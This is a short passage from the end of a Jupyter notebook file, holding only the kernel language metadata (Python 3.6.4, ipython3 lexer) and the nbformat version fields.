   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
